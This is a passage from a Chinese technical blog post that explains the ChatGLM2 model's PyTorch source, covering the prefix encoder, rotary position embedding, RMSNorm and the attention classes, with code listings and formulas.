href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html">先前的llama博客</a>套路一样，我们从底到顶，先从最基础的基件部分代码开始，一步步往上走，从而逐步理解整个模型的架构。</p><h4 id="PrefixEncoder">PrefixEncoder</h4><p>PrefixEncoder 是一个前缀编码器，ChatGLM 模型使用它对历史输入的文本序列进行嵌入编码。从源码中可知，该类结构随用户配置的 <code>config.prefix_projection</code> 而变化，如果为 True，则使用一个两层的 MLP 进行编码，否则直接使用 Embedding 层进行编码。Embedding 层的规模是 <code>config.pre_seq_len</code>，之前的文本长度，每个词的嵌入向量维度是 <code>config.num_layers * config.kv_channels * config.multi_query_group_num * 2 = 28 * 128 * 2 * 2 = 14336</code>。而加的两层 MLP 则是将其降维到 <code>config.hidden_size</code>，其 MLP 内部的参数可以存储更多的权重信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefixEncoder</span>(torch.nn.Module):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    The torch.nn model to encode the prefix</span><br><span class="hljs-string">    Input shape: (batch-size, prefix-length)</span><br><span class="hljs-string">    Output shape: (batch-size, prefix-length, 2*layers*hidden)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: ChatGLMConfig</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.prefix_projection = config.prefix_projection<br>        <span class="hljs-keyword">if</span> self.prefix_projection:<br>            <span class="hljs-comment"># Use a two-layer MLP to encode the prefix</span><br>            kv_size = config.num_layers * config.kv_channels * config.multi_query_group_num * <span class="hljs-number">2</span><br>            self.embedding = torch.nn.Embedding(config.pre_seq_len, kv_size)<br>            self.trans = torch.nn.Sequential(<br>                torch.nn.Linear(kv_size, config.hidden_size),<br>                torch.nn.Tanh(),<br>                torch.nn.Linear(config.hidden_size, kv_size)<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            self.embedding = torch.nn.Embedding(config.pre_seq_len,<br>                                                config.num_layers * config.kv_channels * config.multi_query_group_num * <span class="hljs-number">2</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, prefix: torch.Tensor</span>):<br>        <span class="hljs-keyword">if</span> self.prefix_projection:<br>            prefix_tokens = self.embedding(prefix)<br>            past_key_values = self.trans(prefix_tokens)<br>        <span class="hljs-keyword">else</span>:<br>            past_key_values = self.embedding(prefix)<br>        <span class="hljs-keyword">return</span> past_key_values<br></code></pre></td></tr></table></figure><h4 id="RotaryEmbedding">RotaryEmbedding</h4><p>旋转位置编码的原理在<a href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html">先前的llama博客</a>中已经介绍过。但 <code>apply_rotary_pos_emb</code> 实现有所不同。先放几行公式供读者参考回忆：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub><mo>=</mo><mn>1000</mn><msup><mn>0</mn><mrow><mo>−</mo><mn>2</mn><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>d</mi></mrow></msup><mo separator="true">,</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\theta_i = 10000^{-2(i-1)/d}, i \in [1,2,...,d/2] </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1324em;vertical-align:-0.1944em;"></span><span class="mord">1000</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord">/2</span><span class="mclose">]</span></span></span></span></span></p><center>  <img src="/img/LLM/RoPE3.png" ></center><p>结合前后代码，<code>rope_cache</code> 是 ChatGLM 模型的 <code>RotaryEmbedding</code> 存储的 cos sin cache。其最低维中，0 存储了 cos 值，1 存储了 sin 值，所以 <code>apply_rotary_pos_emb</code> 的 9-15 行出现了一个令人费解的复杂公式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ... code in __init__</span><br>rotary_dim = <span class="hljs-number">128</span><br>RotaryEmbedding(rotary_dim // <span class="hljs-number">2</span>, original_impl=config.original_rope, device=device,<br>                dtype=config.torch_dtype)<br>    theta = <span class="hljs-number">1.0</span> / (base ** (torch.arange(<span class="hljs-number">0</span>, n_elem, <span class="hljs-number">2</span>, dtype=dtype, device=device) / n_elem))<br>    seq_idx = torch.arange(seq_len, dtype=dtype, device=device)<br>    idx_theta = torch.outer(seq_idx, theta).<span class="hljs-built_in">float</span>()<br>    <span class="hljs-comment"># compute cos &amp; sin  shape[seq_len, dim//4, 2]</span><br>    cache = torch.stack([torch.cos(idx_theta), torch.sin(idx_theta)], dim=-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>apply_rotary_pos_emb</code> 将 query tensor 最低维拆成两半，前半部分参与运算，张量是 <code>x: Shape[seq_len, bsz, num_heads, dim//2, 2]</code> 和 <code>rope cache: Shape[seq_len, bsz, 1, dim//2, 2]</code>，可见 cache 的第二维会进行 broadcast，随后将结果的三四维 flatten，变为 <code>Shape[seq_len, bsz, num_heads, dim//2]</code>，并连接上 query tensor 的后半部。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_rotary_pos_emb</span>(<span class="hljs-params">x: torch.Tensor, rope_cache: torch.Tensor</span>) -&gt; torch.Tensor:<br>    <span class="hljs-comment"># x: [sq, b, np, hn]</span><br>    sq, b, np, hn = x.size(<span class="hljs-number">0</span>), x.size(<span class="hljs-number">1</span>), x.size(<span class="hljs-number">2</span>), x.size(<span class="hljs-number">3</span>)<br>    rot_dim = rope_cache.shape[-<span class="hljs-number">2</span>] * <span class="hljs-number">2</span><br>    x, x_pass = x[..., :rot_dim], x[..., rot_dim:]<br>    <span class="hljs-comment"># truncate to support variable sizes</span><br>    rope_cache = rope_cache[:sq]<br>    xshaped = x.reshape(sq, -<span class="hljs-number">1</span>, np, rot_dim // <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>    rope_cache = rope_cache.view(sq, -<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, xshaped.size(<span class="hljs-number">3</span>), <span class="hljs-number">2</span>)<br>    x_out2 = torch.stack(<br>        [<br>            xshaped[..., <span class="hljs-number">0</span>] * rope_cache[..., <span class="hljs-number">0</span>] - xshaped[..., <span class="hljs-number">1</span>] * rope_cache[..., <span class="hljs-number">1</span>],<br>            xshaped[..., <span class="hljs-number">1</span>] * rope_cache[..., <span class="hljs-number">0</span>] + xshaped[..., <span class="hljs-number">0</span>] * rope_cache[..., <span class="hljs-number">1</span>],<br>        ],<br>        -<span class="hljs-number">1</span>,<br>    )<br>    x_out2 = x_out2.flatten(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">return</span> torch.cat((x_out2, x_pass), dim=-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>读者可能觉得奇怪，为何前半部分的 query 参与了运算，后半部分的 query 直接就连接到后面了？事实上我一开始在读这一代码时认为这是个bug，<a href="https://zhuanlan.zhihu.com/p/647085112">知乎上也有人发现了这一点</a>，但经他人提醒，认为这是一个 trick 🤯。但其底层原理是啥我不太清楚了。</p><h4 id="RMSNorm">RMSNorm</h4><p>RMSNorm 归一层的作用和原理也在<a href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html">先前的llama博客</a>中已经介绍过，仅列出相应的公式：$ RMS(a) = \sqrt{\frac{1}{n}\sum_i^n{a_i^2}} <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext></mrow><annotation encoding="application/x-tex">，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">，</span></span></span></span> \bar{a}_i = \frac{a_i}{RMS(a)}g_i$。其源代码与 llama 的也高度相似，不再赘述。</p><h4 id="Attention">Attention</h4><p>ChatGLM 模型的核心是 Attention 机制，其实现与 llama-2 相比有很大不同，但其架构是相似的。仍然是在实现如下公式计算：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mfrac><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><msub><mi>d</mi><mi>k</mi></msub></msqrt></mfrac><mo stretchy="false">)</mo><mi>V</mi></mrow><annotation encoding="application/x-tex"> softmax(\frac{QK^T}{\sqrt{d_k}})V </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.2528em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8572em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.8172em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1828em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span></p><p>但从实现上看，我总结了以下几点不同：</p><ol><li>有两个类实现 attention 机制，SelfAttention 和 CoreAttention 类。</li><li>参与运算的张量维度不同。ChatGLM2 实现与主流的张量维度不同，其 query 张量的维度是 <code>(seq_len, batch_size, num_heads, head_dim)</code>，而一般而言张量的维度是 <code>(batch_size, num_heads, seq_len, head_dim)</code>。这导致代码比较繁琐难懂，我也不理解为何实现要与主流相悖。</li></ol><p>现在，我们来看类 <code>CoreAttention</code> 的具体实现：ChatGLM2 模型的 transform 层中，Multi-Head Attention 有 32 个头，每个头的维度为 128，并且使用了 Grouped-Query Attention 优化技术，将 KV 张量分成了两组，减少权重的内存开销。特别注意到，与 llama 不同的是，ChatGLM2 模型打开了 <code>query_key_layer_scaling</code>，从代码实现上看，层号 <code>layer_number</code> 越大，<code>coeff</code> 越大，因此，<code>norm_factor</code> 也会随之增大。此外，还启用了注意力的 dropout 层。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CoreAttention</span>(torch.nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: ChatGLMConfig, layer_number</span>):<br>        <span class="hljs-built_in">super</span>(CoreAttention, self).__init__()<br><br>        self.apply_query_key_layer_scaling = config.apply_query_key_layer_scaling<br>        self.attention_softmax_in_fp32 = config.attention_softmax_in_fp32<br>        <span class="hljs-keyword">if</span> self.apply_query_key_layer_scaling:<br>            self.attention_softmax_in_fp32 = <span class="hljs-literal">True</span><br>        self.layer_number = <span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, layer_number)<br><br>        projection_size = config.kv_channels * config.num_attention_heads<br><br>        <span class="hljs-comment"># Per attention head and per partition values.</span><br>        self.hidden_size_per_partition = projection_size<br>        self.hidden_size_per_attention_head = projection_size // config.num_attention_heads<br>        self.num_attention_heads_per_partition = config.num_attention_heads<br><br>        coeff = <span class="hljs-literal">None</span><br>        self.norm_factor = math.sqrt(self.hidden_size_per_attention_head)<br>        <span class="hljs-keyword">if</span> self.apply_query_key_layer_scaling:<br>            coeff = self.layer_number<br>            self.norm_factor *= coeff<br>        self.coeff = coeff<br><br>        self.attention_dropout = torch.nn.Dropout(config.attention_dropout)<br></code></pre></td></tr></table></figure><p>torch&gt;=2.0 有针对 Attention 机制的优化接口 <code>nn.functional.scaled_dot_product_attention</code>，因此，ChatGLM2 模型直接使用了该接口。由于上文所说的第一个不同点，在使用接口前，第四行 会对 QKV 张量进行重排。调用完接口后，还要将结果重排回去，得到最终的输出。但令人费解的是，之前说的 <code>query_key_layer_scaling</code> 以及 dropout 层的特性好像对 torch&gt;=2.0 不起作用 🤔（因为代码里压根没用上它们）。</p><p>至于 torch-1 的对注意力机制的裸实现，emmm，代码太过复杂，就算花时间去理解也是白费功夫。总而言之，<code>CoreAttention</code> 类围绕着 torch-2 的 SDPA 接口包装了一下，就完事了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, query_layer, key_layer, value_layer, attention_mask</span>):<br>    pytorch_major_version = <span class="hljs-built_in">int</span>(torch.__version__.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> pytorch_major_version &gt;= <span class="hljs-number">2</span>:<br>        query_layer, key_layer, value_layer = [k.permute(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [query_layer, key_layer, value_layer]]<br>        <span class="hljs-keyword">if</span> attention_mask <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> query_layer.shape[<span class="hljs-number">2</span>] == key_layer.shape[<span class="hljs-number">2</span>]:<br>            context_layer = torch.nn.functional.scaled_dot_product_attention(query_layer, key_layer, value_layer,<br>                                                                                is_causal=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> attention_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                attention_mask = ~attention_mask<br>            context_layer = torch.nn.functional.scaled_dot_product_attention(query_layer, key_layer, value_layer,<br>                                                                                attention_mask)<br>        context_layer = context_layer.permute(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br>        new_context_layer_shape = context_layer.size()[:-<span class="hljs-number">2</span>] + (self.hidden_size_per_partition,)<br>        context_layer = context_layer.reshape(*new_context_layer_shape)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>再来看 <code>SelfAttention</code> 的实现，SelfAttention 类包含了三个组成成分：一）将输入张量转换成 QKV 张量的线性层，二）CoreAttention 类，实现注意力计算。三）将 CoreAttention 的 SDPA 结果转换成输出张量的线性层。其中，线性层的输入维度是 <code>config.hidden_size</code>，输出维度是 <code>config.projection_size</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SelfAttention</span>(torch.nn.Module):<br>    <span class="hljs-string">&quot;&quot;&quot;Parallel self-attention layer abstract class.</span><br><span class="hljs-string">    Self-attention layer takes input with size [s, b, h]</span><br><span class="hljs-string">    and returns output of the same size.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: ChatGLMConfig, layer_number, device=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-built_in">super</span>(SelfAttention, self).__init__()<br>        self.layer_number = <span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, layer_number)<br>        <span class="hljs-comment"># ......</span><br>        self.multi_query_attention = config.multi_query_attention<br>        self.qkv_hidden_size = <span class="hljs-number">3</span> * self.projection_size<br>        <span class="hljs-keyword">if</span> self.multi_query_attention:<br>            self.num_multi_query_groups_per_partition = config.multi_query_group_num<br>            self.qkv_hidden_size = (<br>                    self.projection_size + <span class="hljs-number">2</span> * self.hidden_size_per_attention_head * config.multi_query_group_num<br>            )<br>        self.query_key_value = nn.Linear(config.hidden_size, self.qkv_hidden_size,<br>                                         bias=config.add_bias_linear <span class="hljs-keyword">or</span> config.add_qkv_bias,<br>                                         device=device, **_config_to_kwargs(config)<br>                                         )<br><br>        self.core_attention = CoreAttention(config, self.layer_number)<br><br>        <span class="hljs-comment"># Output.</span><br>        self.dense = nn.Linear(self.projection_size, config.hidden_size, bias=config.add_bias_linear,<br>                               device=device, **_config_to_kwargs(config)<br>                               )<br></code></pre></td></tr></table></figure><p>其 forward 函数的运算过程也可以分成三部分：</p><ul><li>准备 QKV 张量。输入张量 <code>hidden_states</code> 经过线性层后，得到 QKV 混合张量，随后拆分：<code>mixed_x_layer</code> 的最后一维度是 <code>hidden_size + 2 * KV_dim</code>，因为使用了 Grouped-Query Attention 优化技术后，Key Value 张量的头数变少了。对应地，7-9 行也是按照 <code>hidden_size + 2 * KV_dim</code> 拆分出 QKV 张量。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">    self, hidden_states, attention_mask, rotary_pos_emb, kv_cache=<span class="hljs-literal">None</span>, use_cache=<span class="hljs-literal">True</span></span><br><span class="hljs-params"></span>):<br>    <span class="hljs-comment"># hidden_states: [sq, b, h]</span><br><br>    <span class="hljs-comment"># =================================================</span><br>    <span class="hljs-comment"># Pre-allocate memory for key-values for inference.</span><br>    <span class="hljs-comment"># =================================================</span><br>    <span class="hljs-comment"># =====================</span><br>    <span class="hljs-comment"># Query, Key, and Value</span><br>    <span class="hljs-comment"># =====================</span><br><br>    <span class="hljs-comment"># Attention heads [sq, b, h] --&gt; [sq, b, (np * 3 * hn)]</span><br>    mixed_x_layer = self.query_key_value(hidden_states)<br><br>    <span class="hljs-keyword">if</span> self.multi_query_attention:<br>        (query_layer, key_layer, value_layer) = mixed_x_layer.split(<br>            [<br>                self.num_attention_heads_per_partition * self.hidden_size_per_attention_head,<br>                self.num_multi_query_groups_per_partition * self.hidden_size_per_attention_head,<br>                self.num_multi_query_groups_per_partition * self.hidden_size_per_attention_head,<br>            ],<br>            dim=-<span class="hljs-number">1</span>,<br>        )<br></code></pre></td></tr></table></figure><ul><li>将 QKV 张量转变为 <code>Shape[sq, b, np, hn]</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">    query_layer = query_layer.view(<br>        query_layer.size()[:-<span class="hljs-number">1</span>] + (self.num_attention_heads_per_partition, self.hidden_size_per_attention_head)<br>    )<br>    key_layer = key_layer.view(<br>        key_layer.size()[:-<span class="hljs-number">1</span>] + (self.num_multi_query_groups_per_partition, self.hidden_size_per_attention_head)<br>    )<br>    value_layer = value_layer.view(<br>        value_layer.size()[:-<span class="hljs-number">1</span>]<br>        + (self.num_multi_query_groups_per_partition, self.hidden_size_per_attention_head)<br>    )<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># ... no MQA part</span><br></code></pre></td></tr></table></figure><ul><li>准备 RoPE，和 KV cache。QKV 先加入旋转位置编码，再连接上之前的 KV cache 张量。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># apply relative positional encoding (rotary embedding)</span><br><span class="hljs-keyword">if</span> rotary_pos_emb <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    query_layer = apply_rotary_pos_emb(query_layer, rotary_pos_emb)<br>    key_layer = apply_rotary_pos_emb(key_layer, rotary_pos_emb)<br><br><span class="hljs-comment"># adjust key and value for inference</span><br><span class="hljs-keyword">if</span> kv_cache <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    cache_k, cache_v = kv_cache<br>    key_layer = torch.cat((cache_k, key_layer), dim=<span class="hljs-number">0</span>)<br>    value_layer = torch.cat((cache_v, value_layer), dim=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">if</span> use_cache:<br>    kv_cache = (key_layer, value_layer)<br><span class="hljs-keyword">else</span>:<br>    kv_cache = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><ul><li>Grouped-Query Attention 使得 KV 张量的数量只有 <code>num_multi_query_groups_per_partition</code>（两个），但却要对应 <code>num_attention_heads_per_partition</code> 个 Query，因此代码最后要将 KV 张量使用 <a href="https://pytorch.org/docs/stable/generated/torch.Tensor.expand.html">torch.expand</a> 将第三维扩展。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 